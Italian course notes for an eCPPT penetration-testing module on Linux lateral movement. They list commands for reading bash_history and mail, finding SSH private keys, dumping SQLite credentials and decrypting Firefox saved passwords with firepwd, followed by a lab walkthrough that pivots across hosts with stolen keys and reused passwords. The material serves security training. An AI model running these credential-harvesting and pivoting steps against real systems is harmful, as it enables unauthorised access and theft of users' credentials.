# 011 — Linux Lateral Movement Techniques (Lateral Movement & Pivoting)

> **Modulo:** Lateral Movement & Pivoting · **Video:** 11/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [011_Linux Lateral Movement Techniques.txt](011_Linux Lateral Movement Techniques.txt) · [011_Linux Lateral Movement Techniques.srt](011_Linux Lateral Movement Techniques.srt)

## Concetti chiave

- Il protocollo di lateral movement principale su Linux è **SSH** (porta 22).
- Tecniche chiave: **credential reuse**, **abuso di SSH private keys**, **scoperta password in file** (history, DB SQLite, profili browser), **password reuse cross-host**.
- Fonti di credenziali ricorrenti su Linux:
  - `~/.bash_history`
  - `~/.ssh/id_rsa` (chiavi private)
  - file di configurazione applicativi
  - DB SQLite locali
  - **profili Firefox** (`key4.db` + `logins.json`) → password salvate browser
  - `/var/mail/<user>` (email contenenti password)
- Tool dimostrati: **`ssh`**, **`scp`**, **`sqlite3`**, **`firepwd`** (decryptor Firefox), **`su`**.
- Workflow tipico: foothold → enumeration locale → trova cred/chiavi → SSH al prossimo hop → ripeti.

## Spiegazione approfondita

### Differenza con Windows
Niente NTLM, niente WMI/SMB nativo, niente Kerberos by-default (a meno di realms specifici). Su Linux il "lateral movement" è essenzialmente **autenticarsi ad altri host via SSH** sfruttando:
1. Password riusate
2. Chiavi SSH lasciate in `~/.ssh/`
3. Credenziali scoperte in file/DB/mail/browser
4. `su` interno all'host per cambiare utente quando si trova una password

### Topologia del lab (esempio del video)
```
[Kali] ─── SSH ───> [Target 1 / sansa] ─── id_rsa ──> [Target 2 / kate]
                          │                                    │
                          │                                    └─ DB SQLite → password bron
                          │                                                          │
                          │                                                          v
                          │                          [Target 3 / bron]  (Firefox creds → robert)
                          │                                                          │
                          └─ credentials.txt: danny ──> FTP/SSH ──> ...               v
                                                                          [Target 4 / robert]
                                                                                via /var/mail
```

### Pattern tipici di enumeration locale (cosa cercare)
1. **`whoami` / `id` / `pwd`** — identità & contesto.
2. **`cat /etc/passwd`** — utenti del sistema (per `su` o per capire chi loggare via SSH).
3. **`ls -la ~`** + **`cat ~/.bash_history`** — comandi precedenti (spesso contengono `ssh user@host`, password, paths).
4. **`ls -la ~/.ssh/`** — chiavi private (`id_rsa`, `id_ed25519`).
5. **`find / -name "*.sqlite*" 2>/dev/null`** — DB applicativi.
6. **`ls -la /home/*/`** — leggi tutti gli home accessibili.
7. **`~/.mozilla/firefox/<profile>/key4.db` + `logins.json`** → decifrare con **firepwd**.
8. **`/var/mail/<user>`** — email con credenziali.
9. **`sudo -l`** — privilege escalation path.

### SSH key abuse
Se trovi `id_rsa` di un altro utente (per via di permessi mal settati o perché sei lo stesso user):
```bash
# Copia su Kali
scp user@target:/path/to/id_rsa .
chmod 400 id_rsa   # SSH rifiuta key con permessi laschi
ssh -i id_rsa target_user@<NEXT_HOP>
```

### Firefox stored passwords
Firefox cifra le password in `logins.json` con master key in `key4.db`. Tool **firepwd** (Python) decifra entrambi:
```bash
python2 firepwd.py
# legge key4.db + logins.json dalla cwd e stampa user:pass in chiaro
```

### `su` per cambiare utente (post-credential discovery)
Trovata la password di un user diverso (es. in un DB):
```bash
su <username>
# inserisci password → ottieni shell come quell'utente
```
Più subdolo dell'SSH perché non genera log SSH.

### Credential reuse cross-host
Il pattern più ricorrente: la **stessa password** viene riutilizzata da un user su più macchine, o tra servizi diversi (FTP, SSH, SMB…). Sempre provare la cred trovata anche su host già visitati ma con utenti diversi.

## Comandi & strumenti

```bash
# === Discovery ===
ifconfig                                    # interfaccia + subnet
nmap -sn 192.168.0.0/24                     # ping sweep
nmap -sV -p- <subnet/CIDR>                  # service version su tutta la rete
nmap -sV 10.0.0.3 10.0.0.4 10.0.0.5         # version scan IP multipli

# === SSH login ===
ssh user@<TARGET>                           # password
ssh -i id_rsa user@<TARGET>                 # key-based
chmod 400 id_rsa                            # fix permessi

# === Copy file tra host ===
scp user@src:/path/file .                   # download verso Kali
scp file user@dst:/path                     # upload

# === Enumeration on host ===
cat /etc/passwd
cat ~/.bash_history
ls -la /home/*/
find / -name "*.sqlite*" 2>/dev/null
find / -name "id_rsa" 2>/dev/null

# === SQLite ===
sqlite3 database.sqlite
sqlite> .tables
sqlite> SELECT * FROM users;
sqlite> .quit

# === Firefox password dump ===
# Su target: copia profilo
scp user@target:~/.mozilla/firefox/<profile>/key4.db .
scp user@target:~/.mozilla/firefox/<profile>/logins.json .
# Su Kali:
cd /path/to/firepwd
python2 firepwd.py     # legge key4.db + logins.json dalla cwd

# === Switch user ===
su <username>

# === Check mail ===
cat /var/mail/<user>

# === FTP ===
ftp <TARGET>
# anonymous / user
```

## Esempi pratici

```bash
# === 1. Discovery rete interna ===
ifconfig
# eth1: 192.168.69.2/20  → Kali
nmap -sn 192.168.0.0/20
# → host: 192.168.69.3 (target1), .4 (target2), .5 (target3), .6 (target4)
nmap -sV 192.168.69.{3,4,5,6}
# tutti SSH; target3 anche FTP (vsftpd)

# === 2. Foothold target1 (cred date) ===
ssh sansa@192.168.69.3
# password: welcome@123
cat ~/.bash_history
# → traccia: ssh -i id_rsa kate@<target2>
ls -la ~

# === 3. Pivot a target2 via SSH key ===
exit
scp sansa@192.168.69.3:~/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa kate@192.168.69.4

# === 4. Su target2: enum + SQLite ===
ls /home/
# kate, bron
ls -la /home/bron        # contiene database.sqlite leggibile
sqlite3 /home/bron/database.sqlite
sqlite> .tables
sqlite> SELECT * FROM users;
# → hash o password per bron
.quit
su bron
# password trovata nel DB

# === 5. Da kate: dump Firefox profile ===
scp kate@192.168.69.4:~/.mozilla/firefox/xxx.default/key4.db .
scp kate@192.168.69.4:~/.mozilla/firefox/xxx.default/logins.json .
cd firepwd/
python2 firepwd.py
# → bron : <password> per target3

# === 6. SSH a target3 come bron ===
ssh bron@192.168.69.5

# === 7. Su target3: cat /home/danny/credentials.txt ===
cat /home/danny/credentials.txt
# → danny : <password>
# Provala su FTP (target3 ha vsftpd) e SSH
ftp 192.168.69.5
# user danny ✓
ssh danny@192.168.69.3   # password reuse su target1 → funziona

# === 8. Target4 via /var/mail ===
ssh bron@192.168.69.6
cat /var/mail/bron
# email con cred robert
su robert
```

## Punti d'attenzione per l'esame eCPPT

- **SSH è IL protocollo di lateral movement Linux**. Tutto ruota attorno a chiavi e password.
- **`~/.bash_history`** è la fonte #1 di info — sempre cattarlo per primo dopo il foothold.
- **SSH private keys**: cercale ovunque (`find / -name id_rsa`). Permessi richiesti per usarla: **`chmod 400`** (altrimenti SSH rifiuta).
- **Firefox creds**: `key4.db` + `logins.json` → **firepwd** (Python2). Conoscere il workflow.
- **`/var/mail/<user>`**: pattern di password-via-mail molto frequente nei lab.
- **Credential reuse**: la stessa password vale spesso su più host e su servizi diversi (SSH, FTP, MySQL, web admin panel).
- **SQLite locali**: spesso contengono tabelle `users` con credenziali in chiaro o hash deboli (`select * from users`).
- **`su <user>`** = lateral movement intra-host (senza nuova sessione SSH, meno log).
- **Discovery**: subnet `/20` o `/24` da nmap, poi `nmap -sV` mirato sui pochi host vivi.
- **Differenza con Windows**: niente PtH (nessun NTLM), niente WMI. La "hash equivalency" Linux è la **SSH private key** (chi la possiede = autenticato).
- **Nessuna teoria pesante**: il video è quasi al 100% pratico → la prova esame su questo modulo sarà operativa, non concettuale.

## Collegamenti con altri video

- Precedente: [[010_Pass-the-Hash with WMIExec]]
- Prossimo (passa a pivoting): [[012_Pivoting & Port Forwarding with Metasploit]]
- SSH come canale per pivoting: [[014_Pivoting via SSH Tunneling]]
- ReGeorg quando manca SSH/root: [[015_Pivoting with reGeorg]]
